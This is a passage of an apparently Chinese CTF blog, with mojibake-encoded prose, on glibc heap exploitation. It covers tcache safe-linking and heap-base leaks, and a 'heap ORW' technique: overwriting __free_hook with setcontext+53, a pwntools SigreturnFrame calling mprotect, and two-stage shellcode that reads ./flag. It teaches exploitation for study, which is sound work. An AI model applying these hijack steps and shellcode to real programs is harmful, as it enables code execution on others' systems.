tcache<span class="token operator">-></span>entries<span class="token punctuation">[</span>tc_idx<span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token function">REVEAL_PTR</span> <span class="token punctuation">(</span>e<span class="token operator">-></span>next<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token operator">--</span><span class="token punctuation">(</span>tcache<span class="token operator">-></span>counts<span class="token punctuation">[</span>tc_idx<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
e<span class="token operator">-></span>key <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
<span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span> e<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<ul>
<li>æ–°å¢äº†åœ¨ä» tcache ä¸­å–å‡º chunk æ—¶ä¼šæ£€æµ‹ chunk åœ°å€æ˜¯å¦å¯¹é½çš„ä¿æŠ¤(<code>aligned_ok</code>)</li>
<li>å¼•å…¥äº†ä¸¤ä¸ªæ–°çš„å®å¯¹ tcache ä¸­<code>å­˜/å–</code> chunk çš„æ“ä½œè¿›è¡Œäº†ä¸€å±‚ä¿æŠ¤ï¼Œå³åœ¨ new chunk é“¾æ¥ tcache ä¸­ old chunk æ—¶ä¼šè¿›è¡Œä¸€æ¬¡å¼‚æˆ–è¿ç®—ï¼Œä»£ç å¦‚ä¸‹ï¼š</li>
</ul>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#define PROTECT_PTR(pos, ptr) \</span>
<span class="token punctuation">(</span><span class="token punctuation">(</span>__typeof <span class="token punctuation">(</span>ptr<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span>size_t<span class="token punctuation">)</span> pos<span class="token punctuation">)</span> <span class="token operator">>></span> <span class="token number">12</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>size_t<span class="token punctuation">)</span> ptr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token comment">#define REVEAL_PTR(ptr)  PROTECT_PTR (&amp;ptr, ptr)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<blockquote>
<p>å³ tcache_entry-&gt;nextä¸­å­˜æ”¾çš„chunkåœ°å€ä¸º nextçš„åœ°å€å³ç§»12ä½ä¸å½“å‰tcache_entryåœ°å€è¿›è¡Œå¼‚æˆ–è¿ç®—åæ‰€å¾—åˆ°çš„å€¼ï¼Œ è¿™å°±è¦æ±‚æˆ‘ä»¬åœ¨åˆ©ç”¨ tcache_entry è¿›è¡Œä»»æ„åœ°å€å†™ä¹‹å‰ éœ€è¦æˆ‘ä»¬æå‰æ³„æ¼å‡ºç›¸åº” chunk çš„åœ°å€ï¼Œå³æˆ‘ä»¬éœ€è¦æå‰è·å¾—å †åŸºå€åæ‰èƒ½è¿›è¡Œä»»æ„åœ°å€å†™ï¼Œè¿™ç»™ä¼ ç»Ÿçš„åˆ©ç”¨æ–¹å¼æ— ç–‘æ˜¯å¢åŠ äº†ä¸å°‘çš„éš¾åº¦</p>
<p>ä¸è¿‡è‹¥æ˜¯æˆ‘ä»¬èƒ½å¤Ÿç›´æ¥æ§åˆ¶ tcache structï¼Œåˆ™ä»ç„¶å¯ä»¥ç›´æ¥è¿›è¡Œä»»æ„åœ°å€å†™ï¼Œè¿™æ˜¯å› ä¸ºåœ¨ tcache struct ä¸­å­˜æ”¾çš„ä»æ˜¯æœªç»å¼‚æˆ–è¿ç®—çš„åŸå§‹ chunk åœ°å€</p>
</blockquote>
<p>é‚£ä¹ˆå°±æœ‰äº†æ–°çš„åˆ©ç”¨æ–¹æ³•ã€‚</p>
<h4 id="leak-heap-base"><a href="#leak-heap-base" class="headerlink" title="leak heap_base"></a>leak heap_base</h4><p>å½“æˆ‘ä»¬mallocç¬¬ä¸€ä¸ªchunkçš„æ—¶å€™ï¼Œå½“å‰åœ°å€ä½NULLï¼Œä¸‹ä¸€ä¸ªchunkçš„åœ°å€å°±æ˜¯å †åœ°å€ï¼Œç§»12ä½ä¹‹åå¼‚æˆ–ï¼Œå¾—åˆ°çš„å°±æ˜¯<code>heap_base</code>æ‰€ä»¥å®é™…ä¸Šå¯¹å †åŸºå€çš„æ³„éœ²æ›´åŠ ç®€å•äº†</p>
<p>å…·ä½“çš„åˆ©ç”¨çœ‹vnctf2021 ffã€‚</p>
<h3 id="tcacheä»0åˆ°1"><a href="#tcacheä»0åˆ°1" class="headerlink" title="tcacheä»0åˆ°1"></a>tcacheä»0åˆ°1</h3><p>é¦–å…ˆçœ‹ä¸€ä¸‹è¿™ä¸ªçš„ç»“æ„ä½“å§</p>
<pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">&#x2F;* We overlay this structure on the user-data portion of a chunk when the chunk is stored in the per-thread cache.  *&#x2F;
typedef struct tcache_entry
&#123;
  struct tcache_entry *next;
&#125; tcache_entry;

&#x2F;* There is one of these for each thread, which contains the per-thread cache (hence &quot;tcache_perthread_struct&quot;).  Keeping overall size low is mildly important.  Note that COUNTS and ENTRIES are redundant (we could have just counted the linked list each time), this is for performance reasons.  *&#x2F;
typedef struct tcache_perthread_struct
&#123;
  char counts[TCACHE_MAX_BINS];
  tcache_entry *entries[TCACHE_MAX_BINS];
&#125; tcache_perthread_struct;

static __thread tcache_perthread_struct *tcache &#x3D; NULL;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>tcahce_structç»“æ„ä½“å£°æ˜å’Œæˆ‘ä»¬æƒ³çš„ä¸€æ ·ï¼Œå‰é¢æ˜¯å­˜å‚¨countsçš„æ•°ç»„ï¼Œåé¢æ˜¯é“¾è¡¨å¤´ã€‚tcacheé‡Œé¢åªæœ‰ä¸€ä¸ªnextæŒ‡é’ˆ</p>
<p>å†çœ‹ä¸¤ä¸ªå‡½æ•°</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">static</span> <span class="token keyword">void</span>
<span class="token function">tcache_put</span> <span class="token punctuation">(</span>mchunkptr chunk<span class="token punctuation">,</span> <span class="token class-name">size_t</span> tc_idx<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  tcache_entry <span class="token operator">*</span>e <span class="token operator">=</span> <span class="token punctuation">(</span>tcache_entry <span class="token operator">*</span><span class="token punctuation">)</span> <span class="token function">chunk2mem</span> <span class="token punctuation">(</span>chunk<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">assert</span> <span class="token punctuation">(</span>tc_idx <span class="token operator">&lt;</span> TCACHE_MAX_BINS<span class="token punctuation">)</span><span class="token punctuation">;</span>
  e<span class="token operator">-></span>next <span class="token operator">=</span> tcache<span class="token operator">-></span>entries<span class="token punctuation">[</span>tc_idx<span class="token punctuation">]</span><span class="token punctuation">;</span>
  tcache<span class="token operator">-></span>entries<span class="token punctuation">[</span>tc_idx<span class="token punctuation">]</span> <span class="token operator">=</span> e<span class="token punctuation">;</span>
  <span class="token operator">++</span><span class="token punctuation">(</span>tcache<span class="token operator">-></span>counts<span class="token punctuation">[</span>tc_idx<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token operator">*</span>
<span class="token function">tcache_get</span> <span class="token punctuation">(</span><span class="token class-name">size_t</span> tc_idx<span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  tcache_entry <span class="token operator">*</span>e <span class="token operator">=</span> tcache<span class="token operator">-></span>entries<span class="token punctuation">[</span>tc_idx<span class="token punctuation">]</span><span class="token punctuation">;</span>
  <span class="token function">assert</span> <span class="token punctuation">(</span>tc_idx <span class="token operator">&lt;</span> TCACHE_MAX_BINS<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">assert</span> <span class="token punctuation">(</span>tcache<span class="token operator">-></span>entries<span class="token punctuation">[</span>tc_idx<span class="token punctuation">]</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  tcache<span class="token operator">-></span>entries<span class="token punctuation">[</span>tc_idx<span class="token punctuation">]</span> <span class="token operator">=</span> e<span class="token operator">-></span>next<span class="token punctuation">;</span>
  <span class="token operator">--</span><span class="token punctuation">(</span>tcache<span class="token operator">-></span>counts<span class="token punctuation">[</span>tc_idx<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token keyword">void</span> <span class="token operator">*</span><span class="token punctuation">)</span> e<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>å…³äºputsï¼Œæ²¡æœ‰æ£€æŸ¥sizeåŸŸå•¥çš„ï¼Œåªæ£€æŸ¥äº†å¤§å°ã€‚ç„¶ååŠ å…¥åˆ°é“¾è¡¨å¤´getçš„è¯ï¼Œä»å¤´å–å‡ºï¼Œä¹Ÿæ²¡æœ‰å…·ä½“çš„åˆ¤å®šï¼Œæ ¹æ®mallocçš„ç”³è¯·é‡è·å¾—idx,ç„¶åç›´æ¥ä»é“¾è¡¨å¤´å–å‡ºã€‚</p>
<p>è¿™ä¸¤ä¸ªå‡½æ•°åœ¨int_malloc å’Œ int_freeä¹‹å‰ä¼šè¢«è°ƒç”¨ã€‚</p>
<p><strong>åˆ©ç”¨ç‚¹åœ¨malloc</strong>ç”³è¯·çš„æ—¶å€™ï¼Œtcacheæ²¡æœ‰çš„æ—¶å€™ä¹Ÿæœ‰åˆ«çš„æ¥æº</p>
<ul>
<li>fastbinï¼Œå¦‚æœæœ‰ç¬¦åˆå¤§å°çš„chunkï¼Œä¼šè¿”å›chunkï¼Œç„¶åæŠŠå½“å‰é“¾è¡¨å‰©ä¸‹çš„æ”¾åˆ°tcacheé‡Œé¢ã€‚</li>
<li>smallbin åŒç†</li>
<li>unsorted biné‡Œé¢çš„æ—¶å€™å½“æ‰¾åˆ°å¤§å°åˆé€‚çš„é“¾æ—¶ï¼Œå¹¶ä¸ç›´æ¥è¿”å›ï¼Œè€Œæ˜¯å…ˆæ”¾åˆ° tcache ä¸­ï¼Œç»§ç»­å¤„ç†ã€‚</li>
</ul>
<p>fastbinæœ‰ä¸€ç§æ”»å‡»æ‰‹æ³•é’ˆå¯¹è¿™ä¸ªï¼Œå…ˆçœ‹æºç </p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c">  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token punctuation">)</span> <span class="token punctuation">(</span>nb<span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">long</span><span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token function">get_max_fast</span> <span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
      idx <span class="token operator">=</span> <span class="token function">fastbin_index</span> <span class="token punctuation">(</span>nb<span class="token punctuation">)</span><span class="token punctuation">;</span>
      mfastbinptr <span class="token operator">*</span>fb <span class="token operator">=</span> <span class="token operator">&amp;</span><span class="token function">fastbin</span> <span class="token punctuation">(</span>av<span class="token punctuation">,</span> idx<span class="token punctuation">)</span><span class="token punctuation">;</span>
      mchunkptr pp<span class="token punctuation">;</span>
      victim <span class="token operator">=</span> <span class="token operator">*</span>fb<span class="token punctuation">;</span>

      <span class="token keyword">if</span> <span class="token punctuation">(</span>victim <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span>SINGLE_THREAD_P<span class="token punctuation">)</span>
        <span class="token operator">*</span>fb <span class="token operator">=</span> victim<span class="token operator">-></span>fd<span class="token punctuation">;</span>
      <span class="token keyword">else</span>
        <span class="token function">REMOVE_FB</span> <span class="token punctuation">(</span>fb<span class="token punctuation">,</span> pp<span class="token punctuation">,</span> victim<span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">__glibc_likely</span> <span class="token punctuation">(</span>victim <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
        <span class="token punctuation">&#123;</span>
          <span class="token class-name">size_t</span> victim_idx <span class="token operator">=</span> <span class="token function">fastbin_index</span> <span class="token punctuation">(</span><span class="token function">chunksize</span> <span class="token punctuation">(</span>victim<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">__builtin_expect</span> <span class="token punctuation">(</span>victim_idx <span class="token operator">!=</span> idx<span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
              <span class="token function">malloc_printerr</span> <span class="token punctuation">(</span><span class="token string">"malloc(): memory corruption (fast)"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token function">check_remalloced_chunk</span> <span class="token punctuation">(</span>av<span class="token punctuation">,</span> victim<span class="token punctuation">,</span> nb<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">if</span> <span class="token expression">USE_TCACHE</span></span>
          <span class="token comment">/* While we're here, if we see other chunks of the same size,
         stash them in the tcache.  */</span>
          <span class="token class-name">size_t</span> tc_idx <span class="token operator">=</span> <span class="token function">csize2tidx</span> <span class="token punctuation">(</span>nb<span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token keyword">if</span> <span class="token punctuation">(</span>tcache <span class="token operator">&amp;&amp;</span> tc_idx <span class="token operator">&lt;</span> mp_<span class="token punctuation">.</span>tcache_bins<span class="token punctuation">)</span>
        <span class="token punctuation">&#123;</span>
          mchunkptr tc_victim<span class="token punctuation">;</span>

          <span class="token comment">/* While bin not empty and tcache not full, copy chunks.  */</span>
          <span class="token keyword">while</span> <span class="token punctuation">(</span>tcache<span class="token operator">-></span>counts<span class="token punctuation">[</span>tc_idx<span class="token punctuation">]</span> <span class="token operator">&lt;</span> mp_<span class="token punctuation">.</span>tcache_count
            <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span>tc_victim <span class="token operator">=</span> <span class="token operator">*</span>fb<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token constant">NULL</span><span class="token punctuation">)</span>
            <span class="token punctuation">&#123;</span>
              <span class="token keyword">if</span> <span class="token punctuation">(</span>SINGLE_THREAD_P<span class="token punctuation">)</span>
               <span class="token operator">*</span>fb <span class="token operator">=</span> tc_victim<span class="token operator">-></span>fd<span class="token punctuation">;</span>
              <span class="token keyword">else</span>
              <span class="token punctuation">&#123;</span>
                <span class="token function">REMOVE_FB</span> <span class="token punctuation">(</span>fb<span class="token punctuation">,</span> pp<span class="token punctuation">,</span> tc_victim<span class="token punctuation">)</span><span class="token punctuation">;</span>
                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">__glibc_unlikely</span> <span class="token punctuation">(</span>tc_victim <span class="token operator">==</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
                  <span class="token keyword">break</span><span class="token punctuation">;</span>
              <span class="token punctuation">&#125;</span>
              <span class="token function">tcache_put</span> <span class="token punctuation">(</span>tc_victim<span class="token punctuation">,</span> tc_idx<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span>
<span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">endif</span></span>
          <span class="token keyword">void</span> <span class="token operator">*</span>p <span class="token operator">=</span> <span class="token function">chunk2mem</span> <span class="token punctuation">(</span>victim<span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token function">alloc_perturb</span> <span class="token punctuation">(</span>p<span class="token punctuation">,</span> bytes<span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token keyword">return</span> p<span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>å‡½æ•°å’Œå˜é‡å¤ªå¤šäº†æœ‰ç‚¹æ²¡çœ‹æ‡‚ï¼Œåˆ°åé¢å†åˆ†æã€‚</p>
<h4 id="smallbinçš„åˆ©ç”¨"><a href="#smallbinçš„åˆ©ç”¨" class="headerlink" title="smallbinçš„åˆ©ç”¨"></a>smallbinçš„åˆ©ç”¨</h4><p>smallbinè„±é“¾çš„æ—¶å€™ä¹Ÿä¼šæœ‰unlinkè¿™æ ·çš„ä¸œè¥¿ï¼Œä½†æ˜¯æ²¡æœ‰åˆå¹¶çš„æ—¶å€™çš„æ£€æµ‹æœºåˆ¶ï¼Œæ‰€ä»¥unlinkä¹Ÿå¯ä»¥åœ¨è¿™ä¸ªæ¡ä»¶ä¸‹ä½¿ç”¨ï¼Œä½†æ˜¯è¿˜æ²¡è§è¿‡</p>
<h2 id="å †ä¸Šçš„orw"><a href="#å †ä¸Šçš„orw" class="headerlink" title="å †ä¸Šçš„orw"></a>å †ä¸Šçš„orw</h2><p>åˆ©ç”¨setcontextå®ç°ç¨‹åºæµçš„åŠ«æŒã€‚å®šä¹‰</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;ucontext.h></span></span>

<span class="token keyword">int</span> <span class="token function">setcontext</span><span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token class-name">ucontext_t</span> <span class="token operator">*</span>ucp<span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>è€Œè¿™ä¸ªå‡½æ•°çš„å†…å®¹ï¼Œ</p>
<pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">&lt;setcontext&gt;:     push   rdi
&lt;setcontext+1&gt;:   lea    rsi,[rdi+0x128]
&lt;setcontext+8&gt;:   xor    edx,edx
&lt;setcontext+10&gt;:  mov    edi,0x2
&lt;setcontext+15&gt;:  mov    r10d,0x8
&lt;setcontext+21&gt;:  mov    eax,0xe
&lt;setcontext+26&gt;:  syscall 
&lt;setcontext+28&gt;:  pop    rdi
&lt;setcontext+29&gt;:  cmp    rax,0xfffffffffffff001
&lt;setcontext+35&gt;:  jae    0x7ffff7a7d520 &lt;setcontext+128&gt;
&lt;setcontext+37&gt;:  mov    rcx,QWORD PTR [rdi+0xe0]
&lt;setcontext+44&gt;:  fldenv [rcx]
&lt;setcontext+46&gt;:  ldmxcsr DWORD PTR [rdi+0x1c0]
&lt;setcontext+53&gt;:  mov    rsp,QWORD PTR [rdi+0xa0]
&lt;setcontext+60&gt;:  mov    rbx,QWORD PTR [rdi+0x80]
&lt;setcontext+67&gt;:  mov    rbp,QWORD PTR [rdi+0x78]
&lt;setcontext+71&gt;:  mov    r12,QWORD PTR [rdi+0x48]
&lt;setcontext+75&gt;:  mov    r13,QWORD PTR [rdi+0x50]
&lt;setcontext+79&gt;:  mov    r14,QWORD PTR [rdi+0x58]
&lt;setcontext+83&gt;:  mov    r15,QWORD PTR [rdi+0x60]
&lt;setcontext+87&gt;:  mov    rcx,QWORD PTR [rdi+0xa8]
&lt;setcontext+94&gt;:  push   rcx
&lt;setcontext+95&gt;:  mov    rsi,QWORD PTR [rdi+0x70]
&lt;setcontext+99&gt;:  mov    rdx,QWORD PTR [rdi+0x88]
&lt;setcontext+106&gt;: mov    rcx,QWORD PTR [rdi+0x98]
&lt;setcontext+113&gt;: mov    r8,QWORD PTR [rdi+0x28]
&lt;setcontext+117&gt;: mov    r9,QWORD PTR [rdi+0x30]
&lt;setcontext+121&gt;: mov    rdi,QWORD PTR [rdi+0x68]
&lt;setcontext+125&gt;: xor    eax,eax
&lt;setcontext+127&gt;: ret    
&lt;setcontext+128&gt;: mov    rcx,QWORD PTR [rip+0x356951]        # 0x7ffff7dd3e78
&lt;setcontext+135&gt;: neg    eax
&lt;setcontext+137&gt;: mov    DWORD PTR fs:[rcx],eax
&lt;setcontext+140&gt;: or     rax,0xffffffffffffffff
&lt;setcontext+144&gt;: ret<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>åˆ©ç”¨rdiå¯„å­˜å™¨æ§åˆ¶äº†å‡ ä¹æ‰€æœ‰çš„å¯„å­˜å™¨ï¼Œå…¶å®å°±æ˜¯ä¿å­˜å’Œå›å¤ä¸Šä¸‹æ–‡ï¼Œå’ŒSROPåº”è¯¥æœ‰ç±»ä¼¼çš„åŸç†ã€‚</p>
<p>è‡³äºä¸ºä»€ä¹ˆè¦è·³åˆ° <code>setcontext+53</code> è¿™ä¸ªä½ç½®ã€‚å› ä¸º<code>fldenv [rcx]</code>æŒ‡ä»¤ä¼šé€ æˆç¨‹åºæ‰§è¡Œçš„æ—¶å€™ç›´æ¥crashï¼Œæ‰€ä»¥è¦é¿å¼€è¿™ä¸ªæŒ‡ä»¤ã€‚</p>
<blockquote>
<p>æ­¤å¤–rspçš„å€¼ä¹Ÿè¦æ³¨æ„ï¼Œpush ecx å’Œåé¢çš„retï¼Œè¦æ±‚æŒ‡å‘çš„å†…å­˜å¯ä»¥è®¿é—®</p>
</blockquote>
<p><strong>åˆ©ç”¨</strong>ï¼Œå…¶ä¸­å‚æ•°å°±æ˜¯rdiï¼Œæ‰€ä»¥æˆ‘ä»¬å°±æ˜¯è¦æ„é€ ï¼Œ<code>ucontext_t</code>å¯ä»¥åˆ©ç”¨SROPçš„<code>Sigreturnframe()</code>æ¥æ„é€ ç»“æ„ä½“ã€‚</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># æŒ‡å®šæœºå™¨çš„è¿è¡Œæ¨¡å¼</span>
context<span class="token punctuation">.</span>arch <span class="token operator">=</span> <span class="token string">"amd64"</span>
<span class="token comment"># è®¾ç½®å¯„å­˜å™¨</span>
frame <span class="token operator">=</span> SigreturnFrame<span class="token punctuation">(</span><span class="token punctuation">)</span>
frame<span class="token punctuation">.</span>rax <span class="token operator">=</span> <span class="token number">0</span>
frame<span class="token punctuation">.</span>rdi <span class="token operator">=</span> <span class="token number">0</span>
frame<span class="token punctuation">.</span>rsi <span class="token operator">=</span> <span class="token number">0</span>
frame<span class="token punctuation">.</span>rdx <span class="token operator">=</span> <span class="token number">0</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>ç±»ä¼¼ä¸Šé¢ã€‚ä¸€èˆ¬åˆ©ç”¨æ€è·¯å¦‚ä¸‹</p>
<p>æ‰§è¡Œ<code>mprotect</code>å‡½æ•°ï¼Œåæ³¨å…¥shellcodeã€‚ä¹Ÿå¯ä»¥ç›´æ¥ç”¨æ¥æ„é€ ROPé“¾ã€‚</p>
<p><code>æ‰“hookä¸º&lt;setcontext+53&gt;</code>ç„¶å</p>
<p>åªè¦æŠŠè¯¥SigreturnFrameå†™å…¥ä¸€ä¸ªchunkä¸­ï¼Œfreeå®ƒå°±èƒ½è¾¾åˆ°ç›®çš„ï¼Œè¿™é‡Œå°±è¦äº‹å…ˆå»äº†è§£SigreturnFrameçš„ç»“æ„äº†ï¼Œè¿™æ˜¯ä¸€ä¸ªstrç±»å‹çš„ä¸œè¥¿ï¼Œfreeè¿™ä¸ªä¸œè¥¿çš„æ—¶å€™ï¼Œä»–å°±æ˜¯rdiï¼Œé€šè¿‡è¿™ä¸ªå¯ä»¥ç›´æ¥æŒæ§rdiåç§»ä½ç½®çš„å¯„å­˜å™¨ã€‚</p>
<p><img src="https://i.loli.net/2021/04/25/TJmHMPc46jQSXx8.png" alt="å›¾ç‰‡.png" loading="lazy"></p>
<p>é™¤æ‰ç¬¬ä¸€ä¸ªreturnçš„ç³»ç»Ÿè°ƒç”¨ï¼Œåç§»å’Œsetcontextä¸€æ‘¸ä¸€æ ·ã€‚å€¼å¾—æ³¨æ„çš„æ˜¯å½“freeè¿™ä¸ªå˜é‡ä¹‹åï¼Œrspæ˜¯æœ€å…ˆæ¢å¤çš„ï¼Œæ‰€ä»¥å†…å­˜ä¸€å®šè¦å¯ä»¥è®¿é—®ï¼Œ<strong>è€Œrcxå¯¹åº”çš„æ˜¯rdi+0xa8</strong>é‚£ä¹ˆå¯¹åº”åˆ°æ¡†æ¶é‡Œé¢å°±æ˜¯ripæ‰€ä»¥ç­‰ä»·èµ·æ¥å°±æ˜¯æ§åˆ¶ripå°±å¯ä»¥äº†ã€‚æ€»çš„æ¥è¯´ï¼Œä¸€èˆ¬åç§»ä¸å˜ï¼Œç‰¹æ®Šæƒ…å†µé™¤å¤–ã€‚</p>
<p>çœ‹ä¸€æ®µ<code>mprotect</code>çš„åˆ©ç”¨</p>
<p>é¦–å…ˆï¼Œæˆ‘ä»¬æŠŠsetcontent+53çš„åœ°å€å†™å…¥<code>__free_hook</code>ï¼Œå¹¶åœ¨å…¶ä¹‹å0x10å­—èŠ‚å†…å­˜ä¸­å†™ä¸Šä¸¤é<code>__free_hook</code>+0x18çš„åœ°å€ï¼Œæœ€åæŠŠå¦‚ä¸‹shellcode1å†™å…¥ï¼š</p>
<pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">xor rdi,rdi
mov rsi,%d
mov edx,0x1000

mov eax,0
syscall

jmp rsi<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>setcontextçš„ä¸»è¦ä»£ç å¦‚ä¸‹ï¼š</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python">frame <span class="token operator">=</span> SigreturnFrame<span class="token punctuation">(</span><span class="token punctuation">)</span>
frame<span class="token punctuation">.</span>rsp <span class="token operator">=</span> free_hook<span class="token operator">+</span><span class="token number">0x10</span>
frame<span class="token punctuation">.</span>rdi <span class="token operator">=</span> new_addr
frame<span class="token punctuation">.</span>rsi <span class="token operator">=</span> <span class="token number">0x1000</span>
frame<span class="token punctuation">.</span>rdx <span class="token operator">=</span> <span class="token number">7</span>
frame<span class="token punctuation">.</span>rip <span class="token operator">=</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'mprotect'</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>å½“mprotectæ‰§è¡Œå®Œæ—¶ï¼ŒrspæŒ‡å‘<code>__free_hook</code>+0x10ï¼Œå…¶ä¸­çš„å€¼ä¸º<code>__free_hook</code>+0x18ï¼Œè¿™æ ·æˆ‘ä»¬å°±æ‰§è¡Œäº†ç¬¬ä¸€æ®µshellcodeï¼Œè¿™æ®µshellcodeçš„ç›®çš„æ˜¯å¾€æŒ‡å®šå†…å­˜ä¸­è¯»å…¥shellcodeå¹¶è·³è¿‡å»æ‰§è¡Œ<br> æˆ‘ä»¬ç¬¬äºŒæ®µshellcodeå¦‚ä¸‹ï¼š</p>
<pre class="line-numbers language-assembly" data-language="assembly"><code class="language-assembly">mov rax, 0x67616c662f2e ;&#x2F;&#x2F; .&#x2F;flag
push rax

mov rdi, rsp ;&#x2F;&#x2F; .&#x2F;flag
mov rsi, 0 ;&#x2F;&#x2F; O_RDONLY
xor rdx, rdx ;
mov rax, 2 ;&#x2F;&#x2F; SYS_open
syscall

mov rdi, rax ;&#x2F;&#x2F; fd 
mov rsi,rsp  ;
mov rdx, 1024 ;&#x2F;&#x2F; nbytes
mov rax,0 ;&#x2F;&#x2F; SYS_read
syscall

mov rdi, 1 ;&#x2F;&#x2F; fd 
mov rsi, rsp ;&#x2F;&#x2F; buf
mov rdx, rax ;&#x2F;&#x2F; count 
mov rax, 1 ;&#x2F;&#x2F; SYS_write
syscall

mov rdi, 0 ;&#x2F;&#x2F; error_code
mov rax, 60
syscall<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

